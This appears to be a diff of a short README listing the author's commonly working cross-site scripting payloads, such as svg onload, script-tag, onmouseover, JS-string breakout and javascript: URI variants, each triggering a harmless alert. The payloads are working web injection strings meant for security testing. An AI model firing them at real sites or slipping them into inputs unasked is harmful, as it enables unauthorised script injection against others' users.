@@ -1,6 +1,7 @@
 <h1> 🚀Most Common Working Payloads </h1>
-<h2> This is list of XSS Payloads that worked in most cases for me
+<h2> This is list of XSS Payloads that worked in most cases for me </h2>
 
+<h4>
 ```html "><svg/onload=alert(1)>``` - Length bypass Svg Payload </br>
 ```html "><script>alert(1)</script>``` - Basic XSS Payload with script tag </br>
 ```html <div onmouseover="alert(document.domain);">``` - Onmouseover XSS Payload </br>
@@ -16,6 +17,6 @@
 ```\';alert(document.domain)//``` - Inject Alert inside JS String </br>
 ```javascript:alert(1)``` - Works in many ways and combination, also can help escalating Open Redirect to XSS </br>
 ```http://www.<script>alert(1)</script .com```
+</h4>
 
-
-<h2>by Kira Reys
+<h2>by Kira Reys </h2>
